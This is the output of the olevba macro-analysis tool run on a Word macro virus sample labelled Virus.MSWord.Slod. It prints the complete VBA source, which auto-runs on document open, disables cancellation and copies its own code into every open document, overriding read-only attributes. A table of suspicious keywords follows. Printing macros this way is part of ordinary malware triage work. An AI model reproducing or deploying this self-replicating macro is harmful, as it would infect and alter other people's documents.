olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Slod
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Slod - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = Yes
Options.ConfirmConversions = Yes
A = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
For B = 1 To Documents.Count
If Documents.Item(B).ReadOnly = True Then
SetAttr Documents.Item(B).FullName, vbNormal
Documents.Item(B).Reload
Documents.Item(B).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents.Item(B).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Documents.Item(B).VBProject.VBComponents.Item(1).CodeModule.AddFromString A
Documents.Item(B).SaveAs FileName:=Documents.Item(B).FullName
SetAttr Documents.Item(B).FullName, vbReadOnly
Documents.Item(B).Reload
Else
Documents.Item(B).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents.Item(B).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Documents.Item(B).VBProject.VBComponents.Item(1).CodeModule.AddFromString A
Documents.Item(B).SaveAs FileName:=Documents.Item(B).FullName
End If
Documents.Item(B).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents.Item(B).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Documents.Item(B).Saved = True
Next
End Sub 'Dead Dolls By Lys Kovick
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

